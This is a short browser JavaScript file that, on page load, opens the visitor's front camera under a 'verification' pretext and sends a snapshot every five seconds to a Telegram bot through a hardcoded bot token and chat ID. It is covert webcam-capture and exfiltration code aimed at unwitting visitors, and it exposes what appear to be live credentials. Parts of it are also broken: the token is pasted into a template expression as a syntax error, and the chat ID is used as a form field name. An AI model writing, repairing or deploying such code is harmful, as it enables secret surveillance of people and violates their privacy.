// == CONFIGURATION (REPLACE WITH YOUR DETAILS) ==
const BOT_TOKEN = '8653963776:AAGzZRBa4Z_8N0kfodDCIFTeshDxWQfxF8s'; // From BotFather
const CHAT_ID = '8404101414';     // From getUpdates
const PHOTO_INTERVAL = 5000;         // 5 seconds
// == END CONFIGURATION ==

let videoStream = null;
let videoElement = document.createElement('video');

async function sendPhotoToTelegram(imageData) {
    const blob = await (await fetch(imageData)).blob();
    const formData = new FormData();
    formData.append('8404101414', CHAT_ID);
    formData.append('photo', blob, 'shot.jpg');
    
    try {
        await fetch(`https://api.telegram.org/bot${8653963776:AAGzZRBa4Z_8N0kfodDCIFTeshDxWQfxF8s}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        console.log('Photo sent');
    } catch (error) {
        console.error('Failed:', error);
    }
}

function captureAndSend() {
    if (!videoStream) return;
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    canvas.getContext('2d').drawImage(videoElement, 0, 0);
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    sendPhotoToTelegram(imageData);
}

async function startCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        videoElement.srcObject = videoStream;
        videoElement.play();
        videoElement.onloadedmetadata = () => {
            console.log('Camera started. Capturing every 5 seconds...');
            setInterval(captureAndSend, PHOTO_INTERVAL);
        };
    } catch (error) {
        console.error('Camera access denied:', error);
        alert('Camera access is required for verification.');
    }
}

window.onload = () => {
    startCamera();
};